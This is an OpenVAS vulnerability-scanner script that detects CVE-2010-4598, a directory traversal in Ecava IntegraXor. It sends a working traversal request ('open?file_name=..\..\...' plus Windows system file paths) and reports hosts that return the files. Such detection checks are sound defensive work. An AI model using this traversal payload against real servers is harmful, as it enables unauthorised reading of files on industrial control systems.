##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ecava_integraxor_dir_trav_vuln.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# Ecava IntegraXor Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:ecava:integraxor";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801496");
  script_version("$Revision: 13960 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_cve_id("CVE-2010-4598");
  script_bugtraq_id(45535);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Ecava IntegraXor Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ecava_integraxor_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 7131);
  script_mandatory_keys("EcavaIntegraXor/Installed");

  script_tag(name:"insight", value:"The flaw is due to 'open' request, which can be used by an
  attacker to download files from the disk where the server is installed.");
  script_tag(name:"solution", value:"Upgrade to Ecava IntegraXor 3.6.4000.1 or later.");
  script_tag(name:"summary", value:"This host is running Ecava IntegraXor and is prone Directory
  Traversal vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to download
  files from the disk where the server is installed through directory traversal attacks.");
  script_tag(name:"affected", value:"Ecava IntegraXor version 3.6.4000.0 and prior");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15802/");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.ecava.com/index.htm");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files( "windows" );

foreach file( keys( files ) ) {

  url = dir + "/open?file_name=..\..\..\..\..\..\..\..\..\..\..\" + files[file];
  if( http_vuln_check( port:port, url:url, pattern:file  ) ) {
    report = report_vuln_url( url:url, port:port );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
